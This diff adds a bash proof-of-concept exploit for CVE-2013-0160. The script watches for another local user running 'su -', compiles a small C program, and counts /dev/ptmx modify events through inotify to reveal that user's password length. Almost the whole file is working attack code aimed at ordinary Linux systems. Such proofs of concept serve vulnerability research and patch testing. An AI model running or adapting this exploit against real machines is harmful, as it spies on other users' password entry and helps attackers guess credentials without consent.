@@ -1,0 +1,74 @@
+#!/bin/bash
+# ptmx-su-pwdlen.sh -- This PoC determine the password length of a local
+# user who runs "su -".  Done thanks to the ptmx keystroke timing attack
+# (CVE-2013-0160). See http://vladz.devzero.fr/013_ptmx-timing.php for
+# more information.  
+#
+# Tested on Debian 6.0.5 (kernel 2.6.32-5-amd64).
+#
+# "THE BEER-WARE LICENSE" (Revision 42):
+# <vladz@devzero.fr> wrote this file. As long as you retain this notice
+# you can do whatever you want with this stuff. If we meet some day, and
+# you think this stuff is worth it, you can buy me a beer in return. -V.
+
+if ps -e -o cmd= | egrep -q "^(-|^)su"; then
+  echo "[-] Kill/close all running \"su\" session before using this PoC"
+  exit 1
+fi
+
+exe=$(mktemp) || exit 1
+tmp=$(mktemp) || exit 1
+
+cat > ${exe}.c << _EOF_
+#include <stdio.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/inotify.h>
+
+static int count = 0;
+
+void display_result() {
+
+  printf("[+] password len is %d\n", count-1);
+  _exit(0);
+}
+
+int main() {
+
+  int fd;
+  char buf[1024];
+
+  signal(SIGINT, display_result);
+
+  fd = inotify_init();
+  inotify_add_watch(fd, "/dev/ptmx", IN_MODIFY);
+
+  while(read(fd, buf, 1024)) count++; 
+
+  return 0;
+}
+_EOF_
+
+cc -o ${exe}{,.c}
+
+echo "[*] Wait for someone to run \"su -\""
+
+while true; do 
+
+  ps -e -o cmd= | egrep "^(-|^)su" >${tmp}
+  x=$(wc -l ${tmp})
+
+  case ${x% *} in
+
+    1) (( run )) && continue;
+       echo -n "[+] su detected, full command: "
+       cat ${tmp}; ${exe} & 
+       (( run = 1 ))  ;;
+
+    2) [ ! -z "$!" ] && kill -2 $!; break ;;
+
+  esac
+
+done
+
+rm -f ${exe}{,.c} ${tmp}
